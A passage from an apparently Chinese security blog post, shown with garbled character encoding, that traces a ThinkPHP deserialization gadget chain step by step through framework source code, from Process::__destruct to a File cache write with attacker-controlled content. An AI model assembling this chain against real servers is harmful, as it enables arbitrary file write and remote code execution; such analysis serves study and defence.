invoke__">set</span>(<span class="variable">$key</span> = <span class="string">&quot;tag_xxx&quot;</span>, <span class="variable">$value</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">                â””â”€â”€ think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">set</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;tag_xxx&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">int</span> <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">                    â”œâ”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) == <span class="literal">false</span></span><br><span class="line">                    â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) == <span class="literal">false</span></span><br><span class="line">                    â”œâ”€â”€ <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span> = <span class="string">&quot;tag_xxx&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">                    â”‚   â””â”€â”€ <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;tag_xxx&quot;</span>) . <span class="string">&quot;.php&quot;</span></span><br><span class="line">                    â”œâ”€â”€ <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>) = s:<span class="number">30</span>:<span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>;      <span class="comment">// âœ… å†…å®¹å¯æ§</span></span><br><span class="line">                    â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line">                    â”œâ”€â”€ <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span></span><br><span class="line">                    â””â”€â”€ <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)         <span class="comment">// âœ… ç¬¬äºŒæ¬¡å†™å…¥ï¼ˆå†…å®¹å¯æ§ï¼‰</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="è°ƒç”¨é“¾åˆ†æ-4"><a href="#è°ƒç”¨é“¾åˆ†æ-4" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p><code>think\Process-&gt;__destruct</code> å‡½æ•°ä¼šè°ƒç”¨ <code>stop</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stop</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>stop</code> å‡½æ•°ä¸­é—´æœ‰å¾ˆå¤šåˆ¤æ–­å’Œå¹²æ‰°é€»è¾‘ä½†æ˜¯æˆ‘ä»¬åªéœ€è¦è®¾ç½® <code>think\Process-&gt;processInformation[&#39;running&#39;] = true</code>ï¼Œç„¶å <code>think\Process-&gt;status</code> ä¸ºé»˜è®¤å€¼å°±å¯ä»¥ç»•è¿‡ã€‚ä»è€Œé¡ºåˆ©è°ƒç”¨åˆ° <code>close</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">STATUS_READY</span>      = <span class="string">&#x27;ready&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">STATUS_STARTED</span>    = <span class="string">&#x27;started&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$status</span>                       = <span class="built_in">self</span>::<span class="variable constant_">STATUS_READY</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ£€æŸ¥æ˜¯å¦æ­£åœ¨è¿è¡Œ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isRunning</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âœ… $this-&gt;status é»˜è®¤æ˜¯ self::STATUS_READY</span></span><br><span class="line">    <span class="comment">// ä¸ç›¸ç­‰ç›´æ¥è¿”å› false</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ›´æ–°çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $blocking</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateStatus</span>(<span class="params"><span class="variable">$blocking</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âœ… $this-&gt;status é»˜è®¤æ˜¯ self::STATUS_READY</span></span><br><span class="line">    <span class="comment">// ä¸ç›¸ç­‰ç›´æ¥è¿”å›</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç»ˆæ­¢è¿›ç¨‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âŒ $this-&gt;status å¦‚æœæ˜¯é»˜è®¤å€¼åˆ™ä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âœ… $this-&gt;status å¦‚æœæ˜¯é»˜è®¤å€¼åˆ™ updateStatus ä¸æ‰§è¡Œé€»è¾‘</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// âœ… è®¾ç½® $this-&gt;processInformation[&#x27;running&#x27;] = true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ close å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;exitcode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>close</code> å‡½æ•°ä¼šè°ƒç”¨ <code>$this-&gt;processPipes</code> çš„ <code>close</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å…³é—­èµ„æº</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int é€€å‡ºç </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$this-&gt;processPipes</code> è¢«æˆ‘ä»¬è®¾ç½®ä¸º <code>think\model\relation\HasMany</code> å¯¹è±¡ï¼Œè€Œè¯¥å¯¹è±¡æ²¡æœ‰ <code>close</code> æ–¹æ³•ï¼Œå› æ­¤ä¼šè°ƒç”¨ <code>HasMany</code> çš„çˆ¶ç±» <code>Relation</code> çš„ <code>__call</code> å‡½æ•°ã€‚</p>
<p>åœ¨ <code>__call</code> å‡½æ•°ä¸­ï¼Œå¦‚æœ <code>$this-&gt;query</code> ä¸ä¸ºç©ºåˆ™ä¼šè°ƒç”¨ <code>HasMany-&gt;baseQuery</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query) &#123; <span class="comment">// âœ… $this-&gt;query ä¸ä¸ºç©ºï¼Œè¿›å…¥åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">// æ‰§è¡ŒåŸºç¡€æŸ¥è¯¢</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">baseQuery</span>(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ HasMany çš„ baseQuery æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// [...]   </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>HasMany-&gt;baseQuery</code> ä¸­ç»è¿‡ä¸€äº›åˆ¤æ–­ä¼šè°ƒç”¨ <code>$this-&gt;query-&gt;where</code> æ–¹æ³•ã€‚è¿™é‡Œæˆ‘ä»¬è®¾ç½® <code>$this-&gt;query</code> ä¸º <code>think\console\Output</code> å¯¹è±¡ï¼Œè€Œ <code>Output</code> æ²¡æœ‰ <code>where</code> æ–¹æ³•ï¼Œå› æ­¤ä¼šè°ƒç”¨åˆ° <code>Output-&gt;__call</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">baseQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;baseQuery)) &#123; <span class="comment">// âœ… $this-&gt;baseQuery è®¾ç½®ä¸ºç©ºè¿›å…¥åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">// è®¾ç½® $this-&gt;localKey ä¸ºä¸€ä¸ªå±æ€§åï¼Œä¾‹å¦‚ &#x27;k&#x27;</span></span><br><span class="line">        <span class="comment">// è®¾ç½® $this-&gt;parent ä¸ºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œä¾‹å¦‚ stdClass</span></span><br><span class="line">        <span class="comment">// è®¾ç½® $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125; ä¸ºä¸€ä¸ªéç©ºå€¼ï¼Œä¾‹å¦‚ 0</span></span><br><span class="line">        <span class="comment">// âœ… é€šè¿‡ isset æ£€æŸ¥è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) &#123; </span><br><span class="line">            <span class="comment">// $this-&gt;query æŒ‡å‘ think\console\Output å¯¹è±¡</span></span><br><span class="line">            <span class="comment">// ğŸ“Œ è°ƒç”¨ Output-&gt;__call æ–¹æ³•ï¼Œå‚æ•°æ˜¯ï¼š</span></span><br><span class="line">            <span class="comment">// - $this-&gt;foreignKeyï¼šè¦å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼Œä¾‹å¦‚ &quot;file_content&quot;</span></span><br><span class="line">            <span class="comment">// - $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;ï¼šéšä¾¿è®¾ç½®çš„éç©ºå€¼ï¼Œä¾‹å¦‚ 0</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;baseQuery = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å’Œ RCE2 è°ƒç”¨é“¾ä¸€æ ·ï¼Œ<code>Output-&gt;__call</code> æ–¹æ³•æ–¹æ³•å°† <code>$method = &#39;where&#39;</code> æ’å…¥åˆ°å‚æ•°åˆ—è¡¨å¤´éƒ¨ä¹‹åå°±ä¼šè°ƒç”¨è‡ªèº«çš„ <code>block</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $method = &#x27;where&#x27;, $args = [&#x27;file_content&#x27;, 0]</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­ $method æ˜¯å¦åœ¨ $this-&gt;styles åˆ—è¡¨ä¸­</span></span><br><span class="line">    <span class="comment">// âœ… è¿™é‡Œæˆ‘ä»¬è®¾ç½® $this-&gt;styles = [&#x27;where&#x27;] ä»è€Œè¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        <span class="comment">// $method æ’å…¥åˆ°å‚æ•°åˆ—è¡¨ $args å¤´éƒ¨</span></span><br><span class="line">        <span class="comment">// $args: [&#x27;file_content&#x27;, 0] =&gt; [&#x27;where&#x27;, &#x27;file_content&#x27;, 0] </span></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="comment">// ğŸ“Œ è°ƒç”¨ Output-&gt;block æ–¹æ³•ï¼Œå‚æ•°æ˜¯ [&#x27;where&#x27;, &#x27;file_content&#x27;, 0]</span></span><br><span class="line">        <span class="comment">// ä¸è¿‡ Output-&gt;block æ¥æ”¶ 2 ä¸ªå‚æ•°ï¼Œå› æ­¤å‚æ•°åˆ—è¡¨æœ€åçš„å…ƒç´ è¢«å¿½ç•¥</span></span><br><span class="line">        <span class="comment">// å› æ­¤å®é™…ä¼ å‚ä¸º [&#x27;where&#x27;, &#x27;file_content&#x27;]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>éšåæ˜¯ä¸€æ¡å’Œ RCE2 ä¸€æ ·çš„è°ƒç”¨é“¾ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $style = &#x27;where&#x27;, $message = &#x27;file_content&#x27;</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¾“å‡ºä¿¡æ¯å¹¶æ¢è¡Œ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $messages = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL = 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $messages = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool   $newline = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL = 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äº <code>$this-&gt;handle</code> è¢«æˆ‘ä»¬è®¾ç½®ä¸º <code>think\session\driver\Memcache</code> å¯¹è±¡ï¼Œå› æ­¤å’Œ RCE2 ä¸€æ ·ï¼Œéšåä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„ <code>write</code> æ–¹æ³•ã€‚åœ¨ <code>write</code> æ–¹æ³•ä¸­åˆä¼šè°ƒç”¨ <code>this-&gt;handler-&gt;set</code> æ–¹æ³•ï¼Œå…¶ä¸­ <code>$this-&gt;handler</code> è¢«è®¾ç½®ä¸º <code>think\cache\driver\Memcached</code> å¯¹è±¡ã€‚</p>
<p>ç”±äºæˆ‘ä»¬æ²¡æœ‰è®¾ç½® <code>Memcache</code> çš„ <code>$config</code> æˆå‘˜çš„å€¼ï¼Œå› æ­¤åœ¨è®¾ç½®å‚æ•°æ—¶ä½¿ç”¨çš„ <code>$this-&gt;config</code> æ˜¯ç±»ä¸­å®šä¹‰çš„é»˜è®¤å€¼ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">    <span class="string">&#x27;host&#x27;</span>         =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// memcacheä¸»æœº</span></span><br><span class="line">    <span class="string">&#x27;port&#x27;</span>         =&gt; <span class="number">11211</span>, <span class="comment">// memcacheç«¯å£</span></span><br><span class="line">    <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="number">3600</span>, <span class="comment">// sessionæœ‰æ•ˆæœŸ</span></span><br><span class="line">    <span class="string">&#x27;timeout&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">// è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆå•ä½ï¼šæ¯«ç§’ï¼‰</span></span><br><span class="line">    <span class="string">&#x27;persistent&#x27;</span>   =&gt; <span class="literal">true</span>, <span class="comment">// é•¿è¿æ¥</span></span><br><span class="line">    <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// memcache keyå‰ç¼€</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥Session</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string    $sessID = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> String    $sessData = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\cache\driver\Memcached</code> çš„ <code>set</code> æ–¹æ³•æ˜¯ <strong>ThinkPHP ç¼“å­˜ç³»ç»Ÿä¸­çš„ç¼“å­˜å†™å…¥å‡½æ•°</strong>ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ FW1 ä¸­æœ€é‡è¦çš„ä¸€ä¸ªå‡½æ•°ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬å°† <code>think\cache\driver\Memcached</code> çš„ <code>handler</code> æˆå‘˜æŒ‡å‘ <code>think\cache\driver\File</code> å¯¹è±¡å¹¶ç²¾å¿ƒæ„é€ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆæŠŠè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ç®€å•ç†è§£ä¸ºä¸€ä¸ªæ–‡ä»¶å†™å…¥å‡½æ•°ï¼Œå…¶ä¸­ï¼š</p>
<ul>
<li>å°†ç¬¬ <code>$this-&gt;handler-&gt;options[&#39;path&#39;]</code>  ä¸ä¸€ä¸ªå‚æ•° <code>$name</code> çš„ MD5 ä¸ç®€å•æ‹¼æ¥ååŠ ä¸Š <code>.php</code> åç¼€ä½œä¸º<strong>æ–‡ä»¶å</strong>ã€‚</li>
<li>å°†ç¬¬äºŒä¸ªå‚æ•° <code>$value</code> åºåˆ—åŒ–åä¸å…¶ä»–æ•°æ®ç®€å•æ‹¼æ¥ä¹‹åä½œä¸º<strong>æ–‡ä»¶å†…å®¹</strong>ã€‚</li>
</ul>
<p>ç„¶è€Œå½“æˆ‘ä»¬è°ƒç”¨åˆ° <code>set</code> æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬åªèƒ½æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œç¬¬äºŒä¸ªä½œä¸ºæ–‡ä»¶å†…å®¹çš„å‚æ•°ä¸å¯æ§ã€‚å› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åˆ†æä¸€ä¸‹ <code>set</code> çš„è¿‡ç¨‹çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ä»¥æ§åˆ¶æ–‡ä»¶å†…å®¹çš„æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 